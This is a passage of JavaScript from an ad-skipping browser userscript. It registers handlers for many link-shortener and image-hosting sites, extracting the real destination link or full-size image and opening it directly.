    $.openLink(l);
  },
});
$.register({
  rule: {
    host: [
      /^(designinghomey|ani-share|sinopsisfilmku)\.com$/,
      /^motonews\.club$/,
      /^(autofans|landscapenature)\.pw$/,
      /^(sidespace|erogedownload)\.net$/,
    ],
    query: /get=([^&]+)/,
  },
  ready: function (m) {
    'use strict';
    var s = $.searchScripts(/var a='([^']+)'/);
    if (s) {
      $.openLink(s[1]);
      return;
    }
    s = atob(m.query[1]);
    $.openLink(s);
  },
});
$.register({
  rule: {
    host: /^kombatch\.loncat\.pw$/,
  },
  ready: function () {
    'use strict';
    var s = $.searchScripts(/\.open\("([^"]+)",/);
    s = s[1].match(/go=([^&]+)/);
    s = atob(s[1]);
    $.openLink(s);
  },
});
$.register({
  rule: {
    host: [
      /^ww[23]\.picnictrans\.com$/,
      /^short\.awsubs\.(co|me)$/,
    ],
  },
  ready: function () {
    'use strict';
    var a = $('div.kiri > center > a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^techfunda\.net$/,
    path: [
        /^\/link\//,
        /^\/safe\//,
    ],
  },
  ready: function () {
    'use strict';
    var a = $('.hide a.btn');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^thinfi\.com$/,
  },
  ready: function () {
    'use strict';
    var a = $('div p a');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^tinyarrows\.com$/,
    path: /^\/preview\.php$/,
    query: /^\?page=([^&]+)/,
  },
  start: function (m) {
    'use strict';
    $.openLink(decodeURIComponent(m.query[1]));
  },
});
$.register({
  rule: {
    host: /^topload\.pro$/,
  },
  ready: function () {
    'use strict';
    var a = $('.hide a.btn');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?totaldebrid\.org$/,
    path:/\/l\/(l\.php)?$/,
    query: /\?ads=([a-zA-Z0-9=]+)$/,
  },
  start: function (m) {
    'use strict';
    var l = atob(m.query[1]);
    $.openLink(l);
  },
});
$.register({
  rule: {
    host: /^(www\.)?typ\.me$/,
  },
  ready: function (m) {
    'use strict';
    var a = $('#skipAdBtn');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?ultshare\.com$/,
    path: /^\/(?:(?:\d-)?(\d+)|index\.php)$/,
    query: /^(?:\?a=\d&c=(\d+))?$/
  },
  start: function (m) {
    'use strict';
    var linkId = m.path[1]?m.path[1]:m.query[1];
    var directLink = '/3-' + linkId;
    $.openLink(directLink);
  },
});
$.register({
  rule: {
    host: /^unfake\.it$/,
  },
  ready: function () {
    'use strict';
    var frame = $('frame');
    var i = frame.src.lastIndexOf('http://');
    $.openLink(frame.src.substr(i));
  },
});
$.register({
  rule: {
    host: /^(www\.)?(upan|gxp)\.so$/,
    path: /^\/\w+$/,
  },
  ready: function () {
    'use strict';
    var a = $('table.td_line a[onclick="down_process_s();"]');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^url\.ie$/,
  },
  ready: function () {
    'use strict';
    var a = $('a[title="Link to original URL"]');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: [
      /^urlcash\.(com|net|org)$/,
      /^(bat5|detonating|celebclk|eightteen|smilinglinks|peekatmygirlfriend|pornyhost|clb1|urlgalleries)\.com$/,
      /^looble\.net$/,
      /^xxxs\.org$/,
    ],
  },
  ready: function () {
    'use strict';
    if ($.window && $.window.linkDestUrl) {
      $.openLink($.window.linkDestUrl);
      return;
    }
    var matches = document.body.innerHTML.match(/linkDestUrl = '(.+)'/);
    if (matches) {
      $.openLink(matches[1]);
      return;
    }
  },
});
$.register({
  rule: {
    host: /^urlinn\.com$/,
  },
  ready: function () {
    'use strict';
    var m = $('META[HTTP-EQUIV=refresh]').getAttribute('CONTENT').match(/url='([^']+)'/);
    if (m) {
      $.openLink(m[1]);
    }
  },
});
$.register({
  rule: {
    host: /^urlms\.com$/,
  },
  ready: function () {
    'use strict';
    var iframe = $('#content');
    $.openLink(iframe.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?urlv2\.com$/,
  },
  ready: function (m) {
    'use strict';
    if (window.location.pathname.indexOf('locked') >= 0) {
      var path = window.location.pathname.replace('/locked', '');
      $.openLink(path);
      return;
    }
    var m = $.searchScripts(/jeton=([\w]+)/);
    var l = 'http://urlv2.com/algo.php?action=passer&px=0&so=1&jeton=' + m[1];
    window.setTimeout(function() {$.openLink(l)}, 5000);
  },
});
$.register({
  rule: {
    host: /^(www\.)?uskip\.me$/,
    path: /^\/go\/\w+$/,
  },
  ready: function (m) {
    'use strict';
    var a = $('#btn-main');
    $.openLink(a.href);
  },
});
$.register({
  rule: {
    host: /^vavi\.co$/,
  },
  ready: function () {
    'use strict';
    var l = $('#goLink');
    $.openLink(l.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?victly\.com$/,
    path: /^\/\w+$/,
  },
  start: function () {
    'use strict';
    $.post(document.location.href, {
      hidden: '',
      image: 'Skip+Ads',
    }).then(function (text) {
      var m = text.match(/window\.location\.replace\('([^']+)'\)/);
      $.openLink(m[1]);
    });
  },
});
$.register({
  rule: {
    host: /^www\.viidii\.info$/,
  },
  ready: function () {
    'use strict';
    var o = $('#directlink');
    $.openLink(o.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?vir\.al$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/var target_url = '([^']+)';/);
    if (!m) {
      throw new _.AdsBypasserError('site changed');
    }
    $.openLink(m[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?wzzq\.me$/,
  },
  ready: function () {
    'use strict';
    try {
      var l = $('#img_loading_table2  div.wz_img_hit a[target=_blank]').href;
      $.openLink(l);
    } catch (e) {
    }
  },
});
$.register({
  rule: {
    host: /^xlink\.me$/
  },
  ready: function () {
    'use strict';
    var a = $('#main_form > center > a');
    if (!a) {return;}
    $.openLink(a.href);
  },
});
$.register({
  rule: 'http://yep.it/preview.php?p=*',
  ready: function () {
    'use strict';
    var link = $('font[color="grey"]').innerHTML;
    $.openLink(link);
  },
});
$.register({
  rule: 'http://www.yooclick.com/l/*',
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var uniq = $.window.uniq || $.window.uniqi;
    if (!uniq) {return;}
    var path = window.location.pathname;
    var url = _.T('{0}?ajax=true&adblock=false&old=false&framed=false&uniq={1}')(path, uniq);
    var getURL = function() {
      $.get(url).then(function (text) {
        var goodURL = /^(https?|ftp):\/\/(((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:)*@)?(((\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5]))|((([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|\d|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.)+(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])*([a-z]|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])))\.?)(:\d*)?)(\/((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)+(\/(([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)*)*)?)?(\?((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|[\uE000-\uF8FF]|\/|\?)*)?(\#((([a-z]|\d|-|\.|_|~|[\u00A0-\uD7FF\uF900-\uFDCF\uFDF0-\uFFEF])|(%[\da-f]{2})|[!\$&'\(\)\*\+,;=]|:|@)|\/|\?)*)?$/i.test(text);
        if (goodURL) {
          $.openLink(text);
        } else {
          setTimeout(getURL, 500);
        }
      });
    }
    getURL();
  },
});
$.register({
  rule: {
    host: /^ysf\.pl$/,
    path: /^\/3\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    var url = atob(m.path[1]);
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^ysf\.pl$/,
    path: /^\/2\/(.+)$/,
  },
  start: function (m) {
    'use strict';
    var url = m.path[1].match(/.{2}/g).map(function (h) {
      return String.fromCharCode(parseInt(h, 16));
    }).join('');
    $.openLink(url);
  },
});
$.register({
  rule: {
    host: /^www\.zintata\.com$/,
    path: /^\/link\/$/,
  },
  ready: function () {
    'use strict';
    var a = $('#one > center:nth-child(3) > a:nth-child(1)');
    $.openLink(a.href);
  },
});
$.register({
  rule: 'http://zo.mu/redirector/process?link=*',
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    window.location.reload();
  },
});
$.register({
  rule: {
    host: /^zzz\.gl$/,
  },
  ready: function () {
    'use strict';
    var m = $.searchScripts(/var domainurl = '([^']+)';/);
    if (!m) {
      throw new _.AdsBypasserError('site changed');
    }
    $.openLink(m[1]);
  },
});
(function (context, factory) {
  if (typeof module === 'object' && typeof module.exports === 'object') {
    module.exports = function (context, GM) {
      var _ = require('lodash');
      var core = require('./core.js');
      var dom = require('./dom.js');
      var config = require('./config.js');
      var link = require('./link.js');
      var misc = require('./misc.js');
      var modules = [dom, config, link, misc].map(function (v) {
        return v.call(null, context, GM);
      });
      var $ = _.assign.apply(_, modules);
      return factory(context, GM, core, $);
    };
  } else {
    factory(context, {
      getResourceText: GM_getResourceText,
      addStyle: GM_addStyle,
      getResourceURL: GM_getResourceURL,
    }, context._, context.$);
  }
}(this, function (context, GM, _, $) {
  'use strict';
  var window = context.window;
  var document = window.document;
  $.openImage = function (imgSrc, options) {
    options = options || {};
    var replace = !!options.replace;
    var referer = !!options.referer;
    if (replace) {
      replaceBody(imgSrc);
      return;
    }
    if ($.config.redirectImage) {
      $.openLink(imgSrc, {
        referer: referer,
      });
    }
  };
  function enableScrolling () {
    var o = document.compatMode === 'CSS1Compat' ? document.documentElement : document.body;
    o.style.overflow = '';
  };
  function toggleShrinking () {
    this.classList.toggle('adsbypasser-shrinked');
  }
  function checkScaling () {
    var nw = this.naturalWidth;
    var nh = this.naturalHeight;
    var cw = document.documentElement.clientWidth;
    var ch = document.documentElement.clientHeight;
    if ((nw > cw || nh > ch) && !this.classList.contains('adsbypasser-resizable')) {
      this.classList.add('adsbypasser-resizable');
      this.classList.add('adsbypasser-shrinked');
      this.addEventListener('click', toggleShrinking);
    } else {
      this.removeEventListener('click', toggleShrinking);
      this.classList.remove('adsbypasser-shrinked');
      this.classList.remove('adsbypasser-resizable');
    }
  }
  function scaleImage (i) {
    var style = GM.getResourceText('scaleImage');
    GM.addStyle(style);
    if (i.naturalWidth && i.naturalHeight) {
      checkScaling.call(i);
    } else {
      i.addEventListener('load', checkScaling);
    }
    var h;
    window.addEventListener('resize', function () {
      window.clearTimeout(h);
      h = window.setTimeout(checkScaling.bind(i), 100);
    });
  }
  function changeBackground () {
    var bgImage = GM.getResourceURL('bgImage');
    document.body.style.backgroundColor = '#222222';
    document.body.style.backgroundImage = _.T('url(\'{0}\')')(bgImage);
  }
  function alignCenter () {
    var style = GM.getResourceText('alignCenter');
    GM.addStyle(style);
  }
  function injectStyle (d, i) {
    $.removeNodes('style, link[rel=stylesheet]');
    d.id = 'adsbypasser-wrapper';
    i.id = 'adsbypasser-image';
  }
  function replaceBody (imgSrc) {
    if (!$.config.redirectImage) {
      return;
    }
    if (!imgSrc) {
      _.warn('false url');
      return;
    }
    _.info(_.T('replacing body with `{0}` ...')(imgSrc));
    $.removeAllTimer();
    enableScrolling();
    document.body = document.createElement('body');
    var d = document.createElement('div');
    document.body.appendChild(d);
    var i = document.createElement('img');
    i.src = imgSrc;
    d.appendChild(i);
    if ($.config.alignCenter || $.config.scaleImage) {
      injectStyle(d, i);
    }
    if ($.config.alignCenter) {
      alignCenter();
    }
    if ($.config.changeBackground) {
      changeBackground();
    }
    if ($.config.scaleImage) {
      scaleImage(i);
    }
  };
  return $;
}));
$.register({
  rule: [
    {
      host: /^1(dl|be)\.biz$/,
      path: /^\/\w\.php$/,
      query: /^\?\w\/\d+$/,
    },
    {
      host: /^img\.1dl\.biz$/,
      path: /^\/\w\.php$/,
      query: /^\?\w\/([\d\/]+)$/,
    },
  ],
  ready: function () {
    'use strict';
    var a = $('.main a, .main-l a');
    $.openImage(a.href, {
      referer: true,
    });
  },
});
$.register({
  rule: {
    host: /^1pics\.ru$/,
  },
  ready: function () {
    'use strict';
    var img = $('img[alt$="1Pics.Ru"]');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^www\.(2i\.(sk|cz)|2imgs\.com)$/,
  },
  ready: function () {
    'use strict';
    var img = $('#wrap3 img');
    $.openImage(img.src);
  },
});
(function () {
  'use strict';
  function run () {
    var i = $('#image');
    $.openImage(i.src);
  }
  $.register({
    rule: {
      host: /^(www\.)?image(pearl|crest)\.com$/,
      path: /^\/verify\/(.+)$/,
    },
    start: function (m) {
      $.openLink('/view/' + m.path[1]);
    },
  });
  $.register({
    rule: [
      'http://*.abload.de/image.php?img=*',
      'http://www.imageup.ru/*/*/*.html',
      'http://itmages.ru/image/view/*/*',
      {
        host: /^(www\.)?image(pearl|crest)\.com$/,
        path: /^\/view\//,
      },
    ],
    ready: run,
  });
})();
$.register({
  rule: {
    host: /^avenuexxx\.com$/,
  },
  ready: function () {
    'use strict';
    var i = $('#content img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: [
      /^(b4he|fullimg)\.com/,
      /^fastpics\.net/,
      /^ifap\.co/,
    ],
    query: /^\?v=([^&]+)/,
  },
  start: function (m) {
    'use strict';
    $.openImage('/images/' + m.query[1]);
  },
});
$.register({
  rule: {
    host: /^imagep2p\.com$/,
    query: /^\?v=([^&]+)/,
  },
  start: function (m) {
    'use strict';
    $.openImage('/images/' + m.query[1] + '.jpeg');
  },
});
$.register({
  rule: {
    host: /^bayimg\.com$/,
  },
  ready: function () {
    'use strict';
    var i = $('#mainImage');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^beeimg\.com$/,
    path: /\/view\/.*/,
  },
  ready: function () {
    'use strict';
    var img = $('img.img-responsive');
    $.openImage(img.src);
  },
});
$.register({
  rule: 'http://www.bilder-space.de/*.htm',
  ready: function () {
    'use strict';
    $.removeNodes('iframe');
    var img = $('img.picture');
    $.openImage(img.src);
  },
});
$.register({
  rule: 'http://www.bilder-upload.eu/show.php?file=*',
  ready: function () {
    'use strict';
    var i = $('input[type=image]');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://blackcatpix.com/v.php?*',
  ready: function () {
    'use strict';
    var img = $('td center img');
    $.openImage(img.src);
  },
});
$.register({
  rule: 'http://www.casimages.com/img.php?*',
  ready: function () {
    'use strict';
    var img = $('td a img');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: [
      /^www\.x45x\.info$/,
      /^(imadul|mypixxx\.lonestarnaughtygirls)\.com$/,
      /^ghanaimages\.co$/,
      /^imgurban\.info$/,
      /^d69\.in$/,
    ],
    query: /\?p[mt]=(.+)/,
  },
  start: function (m) {
    'use strict';
    $.openImage('/?di=' + m.query[1]);
  },
});
$.register({
  rule: 'http://javelite.tk/viewer.php?id=*',
  ready: function () {
    'use strict';
    var i = $('table img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: [
      /^imgchili\.(com|net)$/,
      /^(www\.)?pixhost\.org$/,
    ],
    path: /^\/show\//,
  },
  ready: function () {
    'use strict';
    $.removeNodes('iframe, #ad');
    try {
      $('#all').style.display = '';
    } catch (e) {
    }
    var o = $('#show_image, #image');
    $.openImage(o.src);
  },
});
$.register({
  rule: {
    host: /^crd\.ht$/,
  },
  ready: function () {
    'use strict';
    var i = $('.continue > form > input[name=link]');
    $.openImage(i.value);
  },
});
$.register({
  rule: 'http://cubeupload.com/im/*',
  ready: function () {
    'use strict';
    var img = $('img.galleryBigImg');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: [
      /^dailyss\.net$/,
      /daily-img\.com$/,
      /img-365\.com$/,
      /^365-img\.com$/,
      /^i\.hentai-ddl\.org$/,
    ],
    path: /^\/image\/.+$/,
  },
  ready: function () {
    'use strict';
    var i = $('#image-viewer-container img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^xxx\.porn0day\.com$/,
    path: /^\/image\/.+$/,
  },
  ready: function () {
    'use strict';
    var i = $('link[rel^=image_src]');
    $.openImage(i.href);
  },
});
$.register({
  rule: {
    host: [
      /^depic\.me$/,
      /^(www\.)?picamatic\.com$/,
    ],
  },
  ready: function () {
    'use strict';
    var i = $('#pic');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^img(dino|tiger|zap)\.com$/,
    path: /^\/viewer\.php$/,
    query: /^\?file=/,
  },
  ready: function () {
    'use strict';
    var o = $('#cursor_lupa');
    $.openImage(o.src);
  },
});
$.register({
  rule: 'http://*.directupload.net/file/*.htm',
  ready: function () {
    'use strict';
    var i = $('#ImgFrame');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^ehdwallpapers\.org$/,
    path: /^\/images\/.*$/,
  },
  ready: function () {
    'use strict';
    var i = $('.entry-content.clearfix img');
    $.openImage(i.src);
  },
});
$.register({
  rule: [
    {
      host: [
        /^(emptypix|imgdomino)\.com$/,
        /^overdream\.cz$/,
        /^www\.sexseeimage\.com$/,
      ],
      path: /^\/image\//,
    },
    {
      host: /^10\.imageleon\.com$/,
      path: /^\/img-(.+)\.html$/,
    },
  ],
  ready: function () {
    'use strict';
    var img = $('#full_image');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^sexyxpixels\.com$/,
    query: /^\?v=/,
  },
  ready: function () {
    'use strict';
    var img = $('#full_image');
    $.openImage(img.src, {
      referer: true,
    });
  },
});
$.register({
  rule: {
    host: /^fastpic\.ru$/,
    path: /^\/view\//,
  },
  ready: function () {
    'use strict';
    var img = $('#picContainer #image');
    $.openImage(img.src, {
      referer: true,
    });
  },
});
$.register({
  rule: 'http://www.fotolink.su/v.php?id=*',
  ready: function () {
    'use strict';
    var i = $('#content img');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://www.fotosik.pl/pokaz_obrazek/pelny/*.html',
  ready: function () {
    'use strict';
    var i = $('a.noborder img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: [
      /^freakimage\.com$/,
      /^www\.hostpic\.org$/,
    ],
    path: /^\/view\.php$/,
    query: /^\?filename=([^&]+)/,
  },
  start: function (m) {
    'use strict';
    $.openImage('/images/' + m.query[1]);
  },
});
$.register({
  rule: {
    host: /^(www\.)?freeimgup\.com$/,
    path: /^\/xxx\//,
  },
  ready: function () {
    'use strict';
    var img = $('#mainimage');
    $.openImage(img.src);
  },
});
$.register({
  rule: [
    'http://funkyimg.com/viewer.php?img=*',
    'http://funkyimg.com/view/*',
  ],
  ready: function () {
    'use strict';
    var i = $('#viewer img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^(www\.)?gallery(nova|sense)\.se$/,
    path: /^\/site\/v\//,
  },
  ready: function () {
    'use strict';
    var i = $('#myUniqueImg').parentNode;
    $.openImage(i.href);
  },
});
$.register({
  rule: {
    host: /^(www\.)?gallerynova\.se$/,
    path: /^\/site\/viewImage\/(\w+)/,
  },
  ready: function (m) {
    'use strict';
    var confirm = $.searchScripts(/\$\("#confirmImage"\).val\("([^"]+)"\)/)[1];
    $.post('/site/viewConfirmCode/' + m.path[1], {
      confirm: confirm
    }).then(function (rawJson) {
      var json = _.parseJSON(rawJson);
      var decodedHTML = document.createTextNode(json.content).data;
      var imgURL = decodedHTML.match(/<a href="([^"]+)" target="_blank">/)[1];
      $.openImage(imgURL);
    });
  },
});
(function () {
  'use strict';
  var hostRule = /^goimagehost\.com$/;
  $.register({
    rule: {
      host: hostRule,
      path: /^\/xxx\/images\//,
    },
  });
  $.register({
    rule: {
      host: hostRule,
      path: /^\/xxx\/(.+)/,
    },
    start: function (m) {
      $.openImage('/xxx/images/' + m.path[1]);
    },
  });
  $.register({
    rule: {
      host: hostRule,
      query: /^\?v=(.+)/,
    },
    start: function (m) {
      $.openImage('/xxx/images/' + m.query[1]);
    },
  });
})();
$.register({
  rule: {
    host: /^www\.(h-animes|adultmove)\.info/,
    path: /^\/.+\/.+\/.+\.html$/,
  },
  ready: function () {
    'use strict';
    var a = $('.dlbutton2 > a');
    $.openImage(a.href);
  },
});
$.register({
  rule: 'http://hentaimg.com/mg/lndex-1.php?img=*',
  ready: function () {
    'use strict';
    $.openLink('index-1.php' + window.location.search);
  },
});
$.register({
  rule: 'http://hentaimg.com/mg/index-1.php?img=*',
  ready: function () {
    'use strict';
    var i = $('#content img');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://www.hostingpics.net/viewer.php?id=*',
  ready: function () {
    'use strict';
    var i = $('#img_viewer');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://ifotos.pl/zobacz/*',
  ready: function () {
    'use strict';
    var m = $('meta[property="og:image"]');
    $.openImage(m.content);
  },
});
$.register({
  rule: {
    host: /^ima\.so$/,
  },
  ready: function () {
    'use strict';
    var a = $('#image_block a');
    $.openImage(a.href);
  },
});
$.register({
  rule: [
    'http://image18.org/show/*',
    'http://screenlist.ru/details.php?image_id=*',
    'http://www.imagenetz.de/*/*.html',
  ],
  ready: function () {
    'use strict';
    var img = $('#picture');
    $.openImage(img.src);
  },
});
$.register({
  rule: {
    host: /^image2you\.ru$/,
    path: /^\/\d+\/\d+/,
  },
  ready: function () {
    'use strict';
    var i = $.$('div.t_tips2 div > img');
    if (!i) {
      $.openLink('', {
        post: {
          _confirm: '',
        },
      });
      return;
    }
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://imagearn.com/image.php?id=*',
  ready: function () {
    'use strict';
    var i = $('#img');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://www.imagebam.com/image/*',
  ready: function () {
    'use strict';
    var o = $('.image-container img[id]');
    $.openImage(o.src, {
      replace: true,
    });
  },
});
$.register({
  rule: {
    host: [
      /^imageheli\.com$/,
      /^imgtube\.net$/,
      /^pixliv\.com$/,
    ],
    path: /^\/img-([a-zA-Z0-9\-]+)\..+$/,
  },
  ready: function () {
    'use strict';
    var a = $.$('a[rel="lightbox"]');
    if (!a) {
      $.openLink('', {
        post: {
          browser_fingerprint: '',
          ads: '0',
        },
      });
      return;
    }
    $.openImage(a.href);
  },
});
$.register({
  rule: 'http://www.imagehousing.com/image/*',
  ready: function () {
    'use strict';
    var i = $('td.text_item img');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://imageno.com/*.html',
  ready: function () {
    'use strict';
    var i = $('#image_div img');
    $.openImage(i.src);
  },
});
$.register({
  rule: 'http://imagepix.org/image/*.html',
  ready: function () {
    'use strict';
    var i = $('img[border="0"]');
    $.openImage(i.src);
  },
});
(function () {
  'use strict';
  function run () {
    var o = $('#download_box img[id]');
    $.openImage(o.src);
  }
  $.register({
    rule: {
      host: /^www\.imageporter\.com$/,
      path: /^\/\w{12}\/.*\.html$/,
    },
    ready: run,
  });
  $.register({
    rule: {
      host: /^(www\.)?(image(carry|dunk|porter|switch)|pic(leet|turedip|tureturn)|imgspice)\.com|(piclambo|yankoimages)\.net$/,
    },
    ready: run,
  });
})();
$.register({
  rule: [
    {
      host: /^imagescream\.com$/,
      path: /^\/img\/(soft\/)?/,
    },
    {
      host: /^(www\.)?(picturescream|picturevip)\.com$/,
      path: /^\/x\//,
    },
    {
      host: [
        /^picturescream\.asia$/,
        /^uploadimage\.eu$/,
      ],
    },
    {
      host: /^postscreens\.info/,
      path: /^\/.*/,
    },
  ],
  ready: function () {
    'use strict';
    var i = $('#shortURL-content img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: [
      /^(imagescream|anonpic)\.com$/,
      /^all-poster\.ru$/,
    ],
    query: /^\?v=/,
  },
  ready: function () {
    'use strict';
    var i = $('#imagen img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^bunnyforum\.org$/,
    query: /^\?v=/,
  },
  ready: function () {
    'use strict';
    var i = $('img[title^=Click]');
    $.openImage(i.src);
  },
});
(function () {
  'use strict';
  var host = /^imageshack\.us$/;
  $.register({
    rule: {
      host: host,
      path: /^\/photo\/.+\/(.+)\/([^\/]+)/,
    },
    start: function (m) {
      $.openImage(_.T('/f/{0}/{1}/')(m.path[1], m.path[2]));
    },
  });
  $.register({
    rule: {
      host: host,
      path: /^\/f\/.+\/[^\/]+/,
    },
    ready: function () {
      var i = $('#fullimg');
      $.openImage(i.src);
    },
  });
})();
$.register({
  rule: 'http://imageshost.ru/photo/*/id*.html',
  ready: function () {
    'use strict';
    var a = $('#bphoto a');
    $.openImage(a.href);
  },
});
(function () {
  'use strict';
  function run () {
    var i = $('#img_obj');
    $.openImage(i.src, {
      referer: true,
    });
  }
  function run2 () {
    var i = $('#img_obj');
    $.openImage(i.src, {
      replace: true,
    });
  }
  $.register({
    rule: [
      {
        host: [
          /^www\.(freebunker|imgcarry|imgshots)\.com$/,
          /^www\.imagesnake\.(com|org)$/,
        ],
        path: /^\/show\.php$/,
        query: /^\?/,
      },
      {
        host: /^www\.(freebunker|imgshots)\.com$/,
        path: /^\/show\//,
      },
      {
        host: [
          /^www\.imagesnake\.(com|org)$/,
          /^www\.imagefruit\.com$/,
        ],
        path: /^\/(img|show)\/.+/,
      },
      {
        host: /^imageban\.(ru|net)$/,
        path: /^\/show\/\d{4}\/\d{2}\/\d{2}\/.+/,
      },
      'http://fotoo.pl/show.php?img=*.html',
      {
        host: /^www\.(fotoszok\.pl|imagestime)\.com$/,
        path: /^\/show\.php\/.*\.html$/,
      },
    ],
    ready: run,
  });
  $.register({
    rule: {
      host: /^www\.imgcarry\.com$/,
      path: /^\/show\//,
    },
    ready: run2,
  });
})();
(function () {
  'use strict';
  function run (rp) {
    if ($.window.jQuery) {
      $.window.jQuery.prototype.append = undefined;
    }
    var i = $('img.pic');
    $.openImage(i.src, {
      replace: rp,
    });
  }
  $.register({
    rule: {
      host: /^imagenpic\.com$/,
      path: /^\/.*\/.+\.html?$/,
    },
    ready: _.P(run, true),
  });
  $.register({
    rule: {
      host: /^imagecherry\.com$/,
    },
    ready: _.P(run, true),
  });
  $.register({
    rule: {
      host: /^imagetwist\.com$/,
    },
    ready: _.P(run, false),
  });
})();
$.register({
  rule: 'http://imageupper.com/i/?*',
  ready: function () {
    'use strict';
    var i = $('#img');
    $.openImage(i.src);
  },
});
$.register({
  rule: [
    'http://*.imagevenue.com/img.php?*',
    'http://hotchyx.com/d/adult-image-hosting-view-08.php?id=*',
    'http://www.hostingfailov.com/photo/*',
  ],
  ready: function () {
    'use strict';
    var i = $('#thepic');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^imagezilla\.net$/,
  },
  ready: function () {
    'use strict';
    var i = $('#photo');
    $.openImage(i.src, {
      referer: true,
    });
  },
});
$.register({
  rule: {
    host: /^imagik\.fr$/,
    path: /^\/view(-rl)?\/(.+)/,
  },
  start: function (m) {
    'use strict';
    $.openImage('/uploads/' + m.path[2]);
  },
});
$.register({
  rule: 'http://img.3ezy.net/*.htm',
  ready: function () {
    'use strict';
    var l = $('link[rel="image_src"]');
    $.openImage(l.href);
  },
});
$.register({
  rule: 'http://img1.imagilive.com/*/*',
  ready: function () {
    'use strict';
    var a = $.$('#page a.button');
    if (a) {
      $.redirect(a.href);
      return;
    }
    var i = $('#page > img:not([id])');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^img24\.org$/,
  },
  ready: function () {
    'use strict';
    var f = $.$('img.img-polaroid + form');
    if (f) {
      f.submit();
      return;
    }
    f = $('img.img-polaroid');
    $.openImage(f.src, {
      referer: true,
    });
  },
});
$.register({
  rule: {
    host: /^img3x\.net$/,
  },
  ready: function () {
    'use strict';
    var f = $.$('form');
    if (f) {
      f.submit();
      return;
    }
    f = $('#show_image');
    $.openImage(f.src);
  },
});
$.register({
  rule: {
    host: /^www\.img(babes|flare)\.com$/,
  },
  ready: function () {
    'use strict';
    var i = $.$('input[onclick]');
    if (i) {
      $.window.Decode();
      return;
    }
    var i = $('#this_image');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^imgbar\.net$/,
    path: /^\/img_show\.php$/,
    query: /^\?view_id=/,
  },
  ready: function () {
    'use strict';
    var i = $('center img');
    $.openImage(i.src);
  },
});
$.register({
  rule: {
    host: /^imgbar\.net$/,
  },
  ready: function () {
    'use strict';
    var i = $('div.panel.top form input[name=sid]');
    $.openLink('/img_show.php?view_id=' + i.value);
  },
});
$.register({
  rule: {
    host: /^imgbin\.me$/,
    path: /^\/view\/([A-Z]+)$/,
  },
  start: function (m) {
    'use strict';
    var tpl = _.T('/image/{0}.jpg');
    $.openImage(tpl(m.path[1]));
  },
});
$.register({
  rule: {
    host: /^imgbox\.com$/,
    path: /^\/[\d\w]+$/,
  },
  ready: function () {
    'use strict';
